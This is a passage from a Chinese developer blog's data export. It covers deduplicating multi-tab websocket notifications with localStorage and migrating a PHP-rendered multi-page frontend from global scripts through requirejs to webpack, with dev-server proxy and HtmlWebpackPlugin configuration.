一秒后重置为未通知，因为同时通知的时间比较接近，所以需要等待1秒左右再重置</span></span><br><span class=\"line\">  setTimeout( <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> localStorage.setItem( <span class=\"string\">'isNotice'</span>, <span class=\"string\">'0'</span> ), <span class=\"number\">1e3</span> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>是不是看起来很完美，对呀我也觉得很完美，可是我们忽略了一个问题，浏览器在往磁盘写文件的时候是需要时间的，而这个Output动作相对于JavaScript的执行来说非常的耗时，两个通知的时间非常非常的接近，经过我的测试最近的达到<code>5ms</code>，还是在只测试了几次的情况。所以这短短的5ms根本来不及将数据写入到磁盘（或许原理不是这样，但在两个标签页的情况下测试结果确实是一个先通知进行磁盘写入，后通知的<code>localStorage.getItem( 'isNotice' )</code>还是等于<code>0</code>）.</p>\n<p>于是我就想到通过<code>localStorage</code>来同步每次通知开启的情况代码太乱就不贴出来了，直接说说思路</p>\n<blockquote>\n<p>标签页通常情况是一个一个打开的，那么我们就直接从websocket链接本身来解决问题，当打开一个页面时我们开启通知，然后在<code>localStorage</code>标记好通知已经开启，同时监听一个叫<code>unonload</code>的事件(就是页面在跳转或关闭时会触发的事件)，事件响应时我们标记通知websocket已经关闭，然后我们新开页面的时候就去再去监听<code>Storage</code>事件（如果通知开启过了），这个事件一旦响应，我们就再去启动<code>websocket</code>链接。连起来的逻辑就是<br><br>整个系统只允许开启一个<code>websocket</code>链接，开启了<code>websocket</code>的页面在关闭时去标记通知已经关闭，其他页面知道后就会再去开启一个<code>websocket</code>链接，可问题就是，只能在两个页面开启的情况下有效，因为如果有两个页面监听了<code>Storage</code>事件，那么还是会开启两次链接，即使解决了这个问题，当浏览器崩溃等非正常关闭页面时，<code>onunload</code>事件不会触发，就是说如果页面崩溃一次，那就再也见不到通知了。这很悲惨，于是我又回到了“<strong>在开启多个websocket连接的情况，如何只通知一次消息</strong>”这个问题</p>\n</blockquote>\n<p>经过一番深思，我想到了“你们这么积极要通知，那好，等你们闹腾完了我再把消息拿去通知吧”，思路是这样的：</p>\n<blockquote>\n<p>通知来临时我们直接将通知内容写到<code>Storage</code>，然后<code>setTimeout</code>延时来取得这个内容进行通知，然后再移除这个通知内容，但是setTimeout的时间非常关键，如果是个固定值，那也白忙活了，必须保证每个页面的延时都不一样且相差较大</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">websocket.onmessage = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> msg </span>) </span>&#123;</span><br><span class=\"line\">  localStorage.setItem( <span class=\"string\">'notice'</span>, msg );</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> noticeContent = localStorage.getItem( <span class=\"string\">'notice'</span> )</span><br><span class=\"line\">    noticeContent &amp;&amp; doNotice( noticeContent );</span><br><span class=\"line\">    localStorage.removeItem( <span class=\"string\">'notice'</span> );</span><br><span class=\"line\">  &#125;, <span class=\"built_in\">Math</span>.random() * <span class=\"number\">3000</span> )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实只能说问题解决了一半，因为算法能力比较捉急，只能随便写个3000内的随机数，如果运气不好随机到很接近的数，还是可能会重复通知，并且页面越多，几率越大。如果你看到这里有什么好的办法，欢迎邮件或留言通知我与我互相交流。</p>\n<p>也许要从根本解决这个问题，就只能开启一个通知吧。</p>\n"},{"title":"记前端从“刀耕火种”过渡到到“现代化”的自动构建工具","catalog":true,"date":"2017-07-22T05:43:49.000Z","subtitle":"从r.js优化器到webpack构建工具的无痛迁移，需要做哪些工作","header-img":"post/IMG_2616.JPG","_content":"博主是14年入的程序员大军，当时主`java`兼具前端开发的活儿，在现在看来的一些流开发框架和新兴思想，早在`node.js`开始进入大家视野的时候就流行起来了，只是在那时博主并没有关注前端的生态圈（然而java好像也并没有关注，逃），所以还是处在很多人所描述的`刀耕火种`的阶段，前端代码全部挂载到全局作用域，包括插件导出的变量。那更别提`组件化`和`模块化`的编程思想了，甚至代码都不用压缩优化就直接上传到服务器发布了。\n\n后来换了一家公司，没有**前端开发**这个职位，是从javaer转过去的，因为项目需要，渐渐的也就坐实了这个岗位。项目到现在（2014年8月-2017年7月22日）一共出现了三个阶段\n>* 用着十年前的开发（或者叫整合）技术的**简陋期**\n>* 经历4、5个月的半模块化改造的**准现代期**\n>* 到现在能整合全局资源（仅限web静态资源）,随意整合新技术的**现代期**（未实施）\n\n为什么要不断的去折腾，去改造？仅仅是为了跟上“现代”的步伐吗？下面我将讲述每个阶段是如何无痛改造的，为什么要改造。\n### 从`简陋期`到`准现代期`\n举个例子，我们以前的代码是这样的\n#### html页面部分\n```html\n<html>\n<head>\n\n<link href=\"style.css\" rel=\"stylesheet\"/>\n</head>\n<body>\n\n<!-- 通用的代码 -->\n<script src=\"common.js\"></script>\n<!-- 第三方的插件代码 -->\n<script src=\"plugin.js\"></script>\n<!-- 我们的主入口 -->\n<script src=\"individual.js\"></script>\n</body>\n</html>\n```\n#### javascript部分\n\n在`common.js`里，是我们的定义的通用函数，比如一些特定组件的部分代码如`header`或`footer`，或者是字符串处理，日期格式化的函数等等，这些函数都以对象或函数的形式暴露在全局作用域里，**非常的冗杂**和不安全，随着代码量的增加，容易导致覆盖，出现难以预料的bug，还有一个致命的弱点就是无法按需加载资源，我哪怕只是用到了其中一个小小的常量，都需要引用整个文件，然后从全局作用域里拿。\n```javascript\n// common.js\nvar Header = {\n  var1: '',\n  var2: {},\n  fn1: function() {\n    // some code\n  },\n  fn2: function() {\n    // some code\n  }\n}\n\nfunction strReplace() {\n  // some code\n}\n...\n```\n```javascript\n// individual.js\n// 也许我们早已有觉悟 使用了自执行匿名函数来防止全局变量的污染\n(function() {\n  // 这里我们需要用到commonjs的函数 常量等\n  var afterHandleStr = strReplace(str);\n\n  // 也许我们忘记strReplace函数已存在全局作用域又或者换了一个人\n  // 来维护这个文件可能又会定义一个函数叫strReplace\n  function strReplace() {\n    // 那么此时根据javascript特性，原先的函数已经被覆盖了，\n    // 上面的调用逻辑优先从最近的作用域开始找，于是会执行到这里\n  }\n\n  ...\n}());\n```\n因为项目是迭代开发的，功能一点点叠加上去，考虑到整个项目的生命周期，不至于到后期完全无法维护，所以我们必须以优雅的姿态去重构整个项目的资源引用方式，那就是**模块化**，一个模块做一件事情，并暴露它对外提供的接口以供具象化的页面来使用。比如`header`，`footer`，`nav`，`sidebar`，`utils`等等。前端的模块化有俩个标准，一个`AMD(Asynchronous Module Definition)`，一个是`CMD(Common Module Definition)`，前者是**异步模块定义，推崇依赖前置**，后者是**通用模块定义，推崇依赖就近**，AMD的代表框架有`requirejs`，CMD的代表框架有`seajs`，都是很优秀的作品，[这里对二者有详细的介绍](https://www.zhihu.com/question/20351507)。最后我选择了`requirejs`作为本次重构的基础，其实就当是的代码来说，改造起来并没有什么难度，就是需要细心，细心，细心，只需要将`common.js`这个通用模块进行拆分就好了，页面只需要引入一个js文件，如下面这样\n```html\n<html>\n<head>\n\n<link href=\"style.css\" rel=\"stylesheet\"/>\n</head>\n<body>\n...\n<script type=\"text/javascript\" data-main=\"/individual.js\" src=\"/require.js\"></script>\n</body>\n</html>\n```\n`data-main`是我们的代码主入口，`src`是`requireJs`的源码。从文件引用来说，至少我们不必再关心每次使用一个插件都要手动来加入一个`script`标签了，如何引用呢？我下面会介绍。\n假如我们以前的代码是这样的\n```javascript\n// common.js\n(function(){\n\n  var exportObj = {\n    aa: 'aa',\n    bb: 'bb'\n    ...\n  }\n\n  var utils = {\n    replaceStr: function() {\n\n    }\n    ...\n  }\n\n  // 放到全局作用域\n  window.exportObj = exportObj;\n  window.utils = utils;\n}());\n\n\n\n// individual。js\n(function(){\n\n  var aa = constants.aa;\n  var bb = constants.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n\n}());\n```\n上面的代码使用了两个全局对象，`constants`和`utils`，那么改造后应该是：\n```javascript\n// constants.js\n// 如果它不依赖于其他模块，就不必声明依赖的数组\ndefine( function() {\n  var exportObj = {\n    aa: 'aa',\n    bb: 'bb'\n    ...\n  }\n\n  // 返回我们要暴露出来的对象，不用再放到全局作用域\n  return exportObj;\n} );\n\n// utils.js\ndefine( function() {\n\n  // 返回我们要暴露出来的对象，不用再放到全局作用域\n  return  {\n    replaceStr: function() {\n\n    }\n    ...\n  };\n} );\n\n// individual\ndefine( [\n  'constants',\n  'utils'\n], function( consts, utils ) {\n  var aa = consts.aa;\n  var bb = consts.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n} );\n// 或者\ndefine( [\n  'constants',\n  'utils'\n], function() {\n  var consts = require('constants');\n  var utils = require('utils');\n\n  var aa = consts.aa;\n  var bb = consts.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n} );\n```\n是不是感觉毫无挑战性，对，这就是一个体力活，细心点就好了\n> 我们不必担心还需要手动去改动第三方插件，现在的主流插件基本都会`UMD`方式去适配，也就是兼容了`AMD`，`CMD`，所以只需要直接引用第三方插件就行了，不必再去html文件里手动引用script标签了，其他具体实现细节和必备的配置可以参照[requirejs官网](http://requirejs.org/)的例子\n\n\n等到改造完，也还没有愉快的结束，我们的**准现代期**增加了一个优化环节，官方提供了`r.js`这个优化器来帮我们打包压缩代码（毕竟生产环境过多的请求数还是不被允许的），此时的改造才真的做到了**模块化**，**能优化**，从**简陋期**无痛过渡到**准现代期**。此时的代码，其实已经具备了进入**现代期**的要求，那就是**规范模块化**。下面是我们即将进行的改造，顺利过渡到**现代期**，从而拥抱你想使用的新技术\n### 从`准现代期`到`现代期`\n其实这个阶段，因为对一些新工具新技术的不熟悉，绕了很多弯子，花费了不少的精力，好在弄出来了，基于`webpack`构建工具，解放键盘`F5`，加入代码风格和规范的检查工具，加入`ECMAScript 6`语法转换工具等等，为什么要使用这些，概括为主要以下几点：\n\n* 提升开发效率和代码质量\n* 新语法新和技术能解决开发上的很多痛点和盲点\n* 强大的整合性和包容性（相对于封闭的`r.js`优化器终于可定制了）\n* emmmmmm思考中\n\n首先我们介绍一下`webapck`是什么\n![webpack](webpack.png)\n这是`webpack`官方文档首页对其的简单描述（ps: 其实中间的正方体是会旋转的哦），强大的`webpack`能整合所有依赖的文件进行处理，如`less`编译（依赖`less-loader`），`ES6`语法转换（依赖`babel-loader`），文件`hash`添加，自动上传ftp发布生产环境等等。还有就是`webpack-dev-server`这个开发神器，**热替换**、**自动监测文件变化刷新浏览器**，虽然`现代期`并没有用到实际项目中去，但是到现在（2017年7月22日）,我已经能完全拿出一套方案，使现有项目平滑过度到`webpack`。（ps：网上的教程大多是基于单页单入口的SPA应用，和后端完全解耦的，我们的项目是和后端处于半解耦状态，并且是多页多入口，所以并不能使用大多数的webpack配置文件，需要进行变通处理）\n\n我们先来说说处理一般的`SPA`应用的配置参数\n```javascript\nmodule.exports = {\n  entry: {\n    // webpack生成的文件名和入口文件\n    // 我们是多页入口，先以首页为例\n    index: './Public/dev/page/main.js'\n  },\n  output: {\n    path: config.build.assetsRoot,\n    filename: '[name].js',\n  },\n  module: {\n    rules: [  {\n      // 各种loaders\n    } ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin( {\n      // 模板生成后的文件名（可以加上路径）\n      filename: 'index.html',\n      // 入口文件的模板（也就是承载你页面视图的地方）\n      template: 'index.html',\n      inject: true\n    })\n  ]\n}\n```\n抛开其他杂七杂八配置不谈，上面的配置就是大多数的`SPA`应用的配置。用在我们的项目里，在根目录运行`webpack`会发现发生错误，并提示缺少很多的模块，因为这些我们自定义的模块`webpack`本身并不能识别，所以这里有至关重要的一步，将现有的`requirejs`的配置文件里的`paths`同步迁移到`webpack`的配置文件里\n```javascript\n// 在requirejs配置文件里可能是这样写的\nrequire.config( {\n\n  paths: {\n    header: './modules/header',\n  }\n\n} );\n\n// 那么我们就应该将此配置交给webpack\nresolve: {\n  alias: {\n    header: 'modules/header' // 路径可能不一定是这个\n  }\n}\n```\n然后我们再打包，运行，发现丫的居然会报错了？最明显的错误就是`define is not defined`。让我们来翻翻上面我们**准现代期**的代码\n```javascript\n// individual\ndefine( [\n  'constants',\n  'utils'\n], function( consts, utils ) {\n  var aa = consts.aa;\n  var bb = consts.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n} );\n```\n这里的`define`就是报错的原因（`webpack`有时候并不能识别这里，有时候却又能正确转换成能运行的代码，没有深究这里的原因，虽然`webpack2`已经支持AMD风格的代码打包，但是我还是决定对这里稍作修改，变成CMD风格，即使是使用`CMD`风格的`seajs`依然是需要去掉外面那层包裹的函数的，不管怎样都得改）,于是我们只需要将上面的代码调整为：\n***\n2017年7月24日22点50分更新，经过我的尝试，只要配置依赖都正确，完全可以直接打包，不用非得改成CMD，于是换成`webpack`更轻松了~~😝\n***\n```javascript\nvar consts = require('constants');\nvar utils = require('utils');\n\nvar aa = consts.aa;\nvar bb = consts.bb;\nvar tempStr = utils.replaceStr('tempStr');\n\n// 如果这里有return的话需要将return obj调整为\nmodule.exports = obj;\n```\n至此我们再打包便可以轻轻松松合并了（当然如果你要提取公共代码的话又是另外一个插件了，这里不再赘述）\n\n打包发布的问题解决了，最重要的一环**开发环境的搭建**呢？\n\n其实机智的我早料到这种配置在我们的项目并不完美，因为`HtmlWebpackPlugin`这个插件需要的模板是放在硬盘里的静态文件模板，它会自动插入构建好的`js`和`css`文件，我们的模板不是静态的，是从php后端渲染的一段动态的html，还是作死试了试，果然出现了以下情况\n* 动态引用的`header、footer`不见了\n* 页面出现一堆后端模板的语法`{$xxx}{$yyy}{$zzz}`\n\n其实`webpack-dev-server`提供了一个代理功能，那这里的问题解决起来就美滋滋了。单纯的我最先的配置是这样的：\n```javascript\nvar express = require( 'express' )\nvar proxyMiddleware = require( 'http-proxy-middleware' )\nvar app = express();\n// 这是代理的\nvar proxyTable = {\n  '/': {\n    target: 'http://xxxx.cn/'\n  }\n}\nObject.keys( proxyTable ).forEach( function( context ) {\n  var options = proxyTable[ context ]\n  if ( typeof options === 'string' ) {\n    options = {\n      target: options\n    }\n  }\n  // 应用代理地址和代理目标\n  app.use( proxyMiddleware( options.filter || context, options ) )\n} )\n```\n以上代码将我们所有的请求路径一股脑全部代理给后端`php`服务了，`HtmlWebpackPlugin`这个插件会自动写入依赖的脚本文件和样式表文件，但是此时的文件是`webpack-dev-server`服务生成的，并且存在于内存里，所以此时我们再运行`webpack`开启的服务，就会造成页面出来了(包括任何动态从服务端渲染的数据)，但是样式和`js`都没有加载，因为请求被代理到了后端，后端的目录里并不存在这些文件（废话么），所以我们需要过滤掉这些特定的请求不让`http-proxy-middleware`插件进行代理，为了区分这些特定的请求，我们将`entry`字段里的文件名都加上一个前缀`__webpack`或任何独一无二的与后台请求开头不一样的字符串，此时`proxyTable`里的`filter`函数就派上用场了，查看官方文档是这么描述这个函数的\n> For full control you can provide a custom function to determine which requests should be proxied or not.\n\n>为了完全控制你的请求，你可以定义一个函数来确定这些请求是否应该被提交\n\n于是我终于拿出一个满意的代理配置文件，开心得我仿佛升职加薪了一样😁\n```javascript\nvar proxyTable = {\n  '/': {\n    target: 'http://xxx.cn/',\n    changeOrigin: true,\n    filter( pathname, req ) {\n      return !new RegExp( `^\\/(__webpack|${assetsSubDirectory})` ).test( pathname );\n    }\n  }\n}\n```\n让我来解释一下上面的代码：未匹配到以`__webpack`开头的请求，都进行代理，这里添加了一个`assetsSubDirectory`变量，这个变量其实是webpack生成的**图片、字体文件、json文件、svg**等仍然存在于内存里的引用的路径，因为在内存里随着我们的编码可能实时变动，所以它们还是不需要做代理，直接过滤掉。\n\n对了，遗漏了一个很重要的配置，代码如下：\n```javascript\nplugins: [\n  new HtmlWebpackPlugin( {\n    alwaysWriteToDisk: true,\n    // php端使用到的模板\n    filename: `${ROOT}/Application/Home/View/Index/index.html`,\n    // 模板文件\n    template: `${ROOT}/Application/Home/View-template/Index/index.html`,\n    chunks: [ '__webpack-indexController' ],\n    inject: true\n  })\n]\n```\n机智的我们肯定能发现`View-template`这里的不同，见名知意，这个文件夹里的html都是对应的后端的模板视图文件，我们通过`alwaysWriteToDisk`这个参数（其实还需要配合另外一个插件）以`template`字段的值为目标，实时写入到`filename`对应的文件里，而此时，因为浏览器访问的页面里因为我们启动`webpack-dev-server`时已经编译了这个文件，js会主动和webpack服务建立一个`eventSource`长连接（这个连接也是排除在代理范围内的）来监听文件变化，所以就会自动刷新浏览器，从而实现我们的`live-reload`。\n\n至此，从`准现代期`到`现代期`的过渡方案就算是完成了，接下面便是寻找一个合适的时间点实施到项目中去。若你要问我那么多页面是不是全都一个个得配，当然是，但是为了方便易维护，能不侵入现有项目去修改文件名，我们肯定需要去手动编写一个`map`映射文件，来指明我们的模板文件对应的入口文件，通过这个map我们再来动态生成`entry`和`HtmlWebpackPlugin`需要的模板路径，当然这里并不是没有便捷的办法，我们可以写一个脚本去读取`View-template`下面的目录来自动生成map但是因为我们童鞋在命名的时候文件夹和对应的入口文件并不能对应上，就得修改，这并不是推荐的做法，而且也不方便我们在改造代码风格的时候进行单个调试。\n\n上面的示例代码都不是完整的，因为我并不是要提供一个`webpack`的教程，而是解决后端和前端html耦合的`webpack-dev-server`配置的问题。","source":"_posts/new-front-end.md","raw":"---\ntitle: 记前端从“刀耕火种”过渡到到“现代化”的自动构建工具\ncatalog: true\ndate: 2017-07-22 13:43:49\nsubtitle: 从r.js优化器到webpack构建工具的无痛迁移，需要做哪些工作\nheader-img: post/IMG_2616.JPG\ntags:\n- javascript\n- webpack\n- AMD CMD\n---\n博主是14年入的程序员大军，当时主`java`兼具前端开发的活儿，在现在看来的一些流开发框架和新兴思想，早在`node.js`开始进入大家视野的时候就流行起来了，只是在那时博主并没有关注前端的生态圈（然而java好像也并没有关注，逃），所以还是处在很多人所描述的`刀耕火种`的阶段，前端代码全部挂载到全局作用域，包括插件导出的变量。那更别提`组件化`和`模块化`的编程思想了，甚至代码都不用压缩优化就直接上传到服务器发布了。\n\n后来换了一家公司，没有**前端开发**这个职位，是从javaer转过去的，因为项目需要，渐渐的也就坐实了这个岗位。项目到现在（2014年8月-2017年7月22日）一共出现了三个阶段\n>* 用着十年前的开发（或者叫整合）技术的**简陋期**\n>* 经历4、5个月的半模块化改造的**准现代期**\n>* 到现在能整合全局资源（仅限web静态资源）,随意整合新技术的**现代期**（未实施）\n\n为什么要不断的去折腾，去改造？仅仅是为了跟上“现代”的步伐吗？下面我将讲述每个阶段是如何无痛改造的，为什么要改造。\n### 从`简陋期`到`准现代期`\n举个例子，我们以前的代码是这样的\n#### html页面部分\n```html\n<html>\n<head>\n\n<link href=\"style.css\" rel=\"stylesheet\"/>\n</head>\n<body>\n\n<!-- 通用的代码 -->\n<script src=\"common.js\"></script>\n<!-- 第三方的插件代码 -->\n<script src=\"plugin.js\"></script>\n<!-- 我们的主入口 -->\n<script src=\"individual.js\"></script>\n</body>\n</html>\n```\n#### javascript部分\n\n在`common.js`里，是我们的定义的通用函数，比如一些特定组件的部分代码如`header`或`footer`，或者是字符串处理，日期格式化的函数等等，这些函数都以对象或函数的形式暴露在全局作用域里，**非常的冗杂**和不安全，随着代码量的增加，容易导致覆盖，出现难以预料的bug，还有一个致命的弱点就是无法按需加载资源，我哪怕只是用到了其中一个小小的常量，都需要引用整个文件，然后从全局作用域里拿。\n```javascript\n// common.js\nvar Header = {\n  var1: '',\n  var2: {},\n  fn1: function() {\n    // some code\n  },\n  fn2: function() {\n    // some code\n  }\n}\n\nfunction strReplace() {\n  // some code\n}\n...\n```\n```javascript\n// individual.js\n// 也许我们早已有觉悟 使用了自执行匿名函数来防止全局变量的污染\n(function() {\n  // 这里我们需要用到commonjs的函数 常量等\n  var afterHandleStr = strReplace(str);\n\n  // 也许我们忘记strReplace函数已存在全局作用域又或者换了一个人\n  // 来维护这个文件可能又会定义一个函数叫strReplace\n  function strReplace() {\n    // 那么此时根据javascript特性，原先的函数已经被覆盖了，\n    // 上面的调用逻辑优先从最近的作用域开始找，于是会执行到这里\n  }\n\n  ...\n}());\n```\n因为项目是迭代开发的，功能一点点叠加上去，考虑到整个项目的生命周期，不至于到后期完全无法维护，所以我们必须以优雅的姿态去重构整个项目的资源引用方式，那就是**模块化**，一个模块做一件事情，并暴露它对外提供的接口以供具象化的页面来使用。比如`header`，`footer`，`nav`，`sidebar`，`utils`等等。前端的模块化有俩个标准，一个`AMD(Asynchronous Module Definition)`，一个是`CMD(Common Module Definition)`，前者是**异步模块定义，推崇依赖前置**，后者是**通用模块定义，推崇依赖就近**，AMD的代表框架有`requirejs`，CMD的代表框架有`seajs`，都是很优秀的作品，[这里对二者有详细的介绍](https://www.zhihu.com/question/20351507)。最后我选择了`requirejs`作为本次重构的基础，其实就当是的代码来说，改造起来并没有什么难度，就是需要细心，细心，细心，只需要将`common.js`这个通用模块进行拆分就好了，页面只需要引入一个js文件，如下面这样\n```html\n<html>\n<head>\n\n<link href=\"style.css\" rel=\"stylesheet\"/>\n</head>\n<body>\n...\n<script type=\"text/javascript\" data-main=\"/individual.js\" src=\"/require.js\"></script>\n</body>\n</html>\n```\n`data-main`是我们的代码主入口，`src`是`requireJs`的源码。从文件引用来说，至少我们不必再关心每次使用一个插件都要手动来加入一个`script`标签了，如何引用呢？我下面会介绍。\n假如我们以前的代码是这样的\n```javascript\n// common.js\n(function(){\n\n  var exportObj = {\n    aa: 'aa',\n    bb: 'bb'\n    ...\n  }\n\n  var utils = {\n    replaceStr: function() {\n\n    }\n    ...\n  }\n\n  // 放到全局作用域\n  window.exportObj = exportObj;\n  window.utils = utils;\n}());\n\n\n\n// individual。js\n(function(){\n\n  var aa = constants.aa;\n  var bb = constants.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n\n}());\n```\n上面的代码使用了两个全局对象，`constants`和`utils`，那么改造后应该是：\n```javascript\n// constants.js\n// 如果它不依赖于其他模块，就不必声明依赖的数组\ndefine( function() {\n  var exportObj = {\n    aa: 'aa',\n    bb: 'bb'\n    ...\n  }\n\n  // 返回我们要暴露出来的对象，不用再放到全局作用域\n  return exportObj;\n} );\n\n// utils.js\ndefine( function() {\n\n  // 返回我们要暴露出来的对象，不用再放到全局作用域\n  return  {\n    replaceStr: function() {\n\n    }\n    ...\n  };\n} );\n\n// individual\ndefine( [\n  'constants',\n  'utils'\n], function( consts, utils ) {\n  var aa = consts.aa;\n  var bb = consts.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n} );\n// 或者\ndefine( [\n  'constants',\n  'utils'\n], function() {\n  var consts = require('constants');\n  var utils = require('utils');\n\n  var aa = consts.aa;\n  var bb = consts.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n} );\n```\n是不是感觉毫无挑战性，对，这就是一个体力活，细心点就好了\n> 我们不必担心还需要手动去改动第三方插件，现在的主流插件基本都会`UMD`方式去适配，也就是兼容了`AMD`，`CMD`，所以只需要直接引用第三方插件就行了，不必再去html文件里手动引用script标签了，其他具体实现细节和必备的配置可以参照[requirejs官网](http://requirejs.org/)的例子\n\n\n等到改造完，也还没有愉快的结束，我们的**准现代期**增加了一个优化环节，官方提供了`r.js`这个优化器来帮我们打包压缩代码（毕竟生产环境过多的请求数还是不被允许的），此时的改造才真的做到了**模块化**，**能优化**，从**简陋期**无痛过渡到**准现代期**。此时的代码，其实已经具备了进入**现代期**的要求，那就是**规范模块化**。下面是我们即将进行的改造，顺利过渡到**现代期**，从而拥抱你想使用的新技术\n### 从`准现代期`到`现代期`\n其实这个阶段，因为对一些新工具新技术的不熟悉，绕了很多弯子，花费了不少的精力，好在弄出来了，基于`webpack`构建工具，解放键盘`F5`，加入代码风格和规范的检查工具，加入`ECMAScript 6`语法转换工具等等，为什么要使用这些，概括为主要以下几点：\n\n* 提升开发效率和代码质量\n* 新语法新和技术能解决开发上的很多痛点和盲点\n* 强大的整合性和包容性（相对于封闭的`r.js`优化器终于可定制了）\n* emmmmmm思考中\n\n首先我们介绍一下`webapck`是什么\n![webpack](webpack.png)\n这是`webpack`官方文档首页对其的简单描述（ps: 其实中间的正方体是会旋转的哦），强大的`webpack`能整合所有依赖的文件进行处理，如`less`编译（依赖`less-loader`），`ES6`语法转换（依赖`babel-loader`），文件`hash`添加，自动上传ftp发布生产环境等等。还有就是`webpack-dev-server`这个开发神器，**热替换**、**自动监测文件变化刷新浏览器**，虽然`现代期`并没有用到实际项目中去，但是到现在（2017年7月22日）,我已经能完全拿出一套方案，使现有项目平滑过度到`webpack`。（ps：网上的教程大多是基于单页单入口的SPA应用，和后端完全解耦的，我们的项目是和后端处于半解耦状态，并且是多页多入口，所以并不能使用大多数的webpack配置文件，需要进行变通处理）\n\n我们先来说说处理一般的`SPA`应用的配置参数\n```javascript\nmodule.exports = {\n  entry: {\n    // webpack生成的文件名和入口文件\n    // 我们是多页入口，先以首页为例\n    index: './Public/dev/page/main.js'\n  },\n  output: {\n    path: config.build.assetsRoot,\n    filename: '[name].js',\n  },\n  module: {\n    rules: [  {\n      // 各种loaders\n    } ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin( {\n      // 模板生成后的文件名（可以加上路径）\n      filename: 'index.html',\n      // 入口文件的模板（也就是承载你页面视图的地方）\n      template: 'index.html',\n      inject: true\n    })\n  ]\n}\n```\n抛开其他杂七杂八配置不谈，上面的配置就是大多数的`SPA`应用的配置。用在我们的项目里，在根目录运行`webpack`会发现发生错误，并提示缺少很多的模块，因为这些我们自定义的模块`webpack`本身并不能识别，所以这里有至关重要的一步，将现有的`requirejs`的配置文件里的`paths`同步迁移到`webpack`的配置文件里\n```javascript\n// 在requirejs配置文件里可能是这样写的\nrequire.config( {\n\n  paths: {\n    header: './modules/header',\n  }\n\n} );\n\n// 那么我们就应该将此配置交给webpack\nresolve: {\n  alias: {\n    header: 'modules/header' // 路径可能不一定是这个\n  }\n}\n```\n然后我们再打包，运行，发现丫的居然会报错了？最明显的错误就是`define is not defined`。让我们来翻翻上面我们**准现代期**的代码\n```javascript\n// individual\ndefine( [\n  'constants',\n  'utils'\n], function( consts, utils ) {\n  var aa = consts.aa;\n  var bb = consts.bb;\n  \n  var tempStr = utils.replaceStr('tempStr');\n} );\n```\n这里的`define`就是报错的原因（`webpack`有时候并不能识别这里，有时候却又能正确转换成能运行的代码，没有深究这里的原因，虽然`webpack2`已经支持AMD风格的代码打包，但是我还是决定对这里稍作修改，变成CMD风格，即使是使用`CMD`风格的`seajs`依然是需要去掉外面那层包裹的函数的，不管怎样都得改）,于是我们只需要将上面的代码调整为：\n***\n2017年7月24日22点50分更新，经过我的尝试，只要配置依赖都正确，完全可以直接打包，不用非得改成CMD，于是换成`webpack`更轻松了~~😝\n***\n```javascript\nvar consts = require('constants');\nvar utils = require('utils');\n\nvar aa = consts.aa;\nvar bb = consts.bb;\nvar tempStr = utils.replaceStr('tempStr');\n\n// 如果这里有return的话需要将return obj调整为\nmodule.exports = obj;\n```\n至此我们再打包便可以轻轻松松合并了（当然如果你要提取公共代码的话又是另外一个插件了，这里不再赘述）\n\n打包发布的问题解决了，最重要的一环**开发环境的搭建**呢？\n\n其实机智的我早料到这种配置在我们的项目并不完美，因为`HtmlWebpackPlugin`这个插件需要的模板是放在硬盘里的静态文件模板，它会自动插入构建好的`js`和`css`文件，我们的模板不是静态的，是从php后端渲染的一段动态的html，还是作死试了试，果然出现了以下情况\n* 动态引用的`header、footer`不见了\n* 页面出现一堆后端模板的语法`{$xxx}{$yyy}{$zzz}`\n\n其实`webpack-dev-server`提供了一个代理功能，那这里的问题解决起来就美滋滋了。单纯的我最先的配置是这样的：\n```javascript\nvar express = require( 'express' )\nvar proxyMiddleware = require( 'http-proxy-middleware' )\nvar app = express();\n// 这是代理的\nvar proxyTable = {\n  '/': {\n    target: 'http://xxxx.cn/'\n  }\n}\nObject.keys( proxyTable ).forEach( function( context ) {\n  var options = proxyTable[ context ]\n  if ( typeof options === 'string' ) {\n    options = {\n      target: options\n    }\n  }\n  // 应用代理地址和代理目标\n  app.use( proxyMiddleware( options.filter || context, options ) )\n} )\n```\n以上代码将我们所有的请求路径一股脑全部代理给后端`php`服务了，`HtmlWebpackPlugin`这个插件会自动写入依赖的脚本文件和样式表文件，但是此时的文件是`webpack-dev-server`服务生成的，并且存在于内存里，所以此时我们再运行`webpack`开启的服务，就会造成页面出来了(包括任何动态从服务端渲染的数据)，但是样式和`js`都没有加载，因为请求被代理到了后端，后端的目录里并不存在这些文件（废话么），所以我们需要过滤掉这些特定的请求不让`http-proxy-middleware`插件进行代理，为了区分这些特定的请求，我们将`entry`字段里的文件名都加上一个前缀`__webpack`或任何独一无二的与后台请求开头不一样的字符串，此时`proxyTable`里的`filter`函数就派上用场了，查看官方文档是这么描述这个函数的\n> For full control you can provide a custom function to determine which requests should be proxied or not.\n\n>为了完全控制你的请求，你可以定义一个函数来确定这些请求是否应该被提交\n\n于是我终于拿出一个满意的代理配置文件，开心得我仿佛升职加薪了一样😁\n```javascript\nvar proxyTable = {\n  '/': {\n    target: 'http://xxx.cn/',\n    changeOrigin: true,\n    filter( pathname, req ) {\n      return !new RegExp( `^\\/(__webpack|${assetsSubDirectory})` ).test( pathname );\n    }\n  